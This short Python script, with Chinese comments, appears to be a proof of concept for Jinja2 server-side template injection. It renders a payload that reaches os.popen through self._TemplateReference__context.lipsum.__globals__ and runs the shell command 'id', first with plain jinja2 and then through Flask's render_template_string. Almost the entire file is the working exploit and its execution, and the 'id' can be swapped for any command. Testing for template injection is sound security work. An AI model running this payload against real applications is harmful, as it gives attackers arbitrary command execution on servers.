from jinja2 import Environment
from flask import  Flask,Blueprint, render_template, request, flash, redirect, url_for, render_template_string

env = Environment()
result = env.from_string("Verified! {}".format("{{self._TemplateReference__context.lipsum.__globals__.os.popen(\"id\").read()}}")).render()

print(f"jinja2 結果: {result}")
print("====")

app = Flask(__name__)

# 方法 1a: 使用 with app.app_context()
with app.app_context():
    result = render_template_string("Verified! {}".format("{{self._TemplateReference__context.lipsum.__globals__.os.popen(\"id\").read()}}"))
    print(f"flask 結果: {result}")

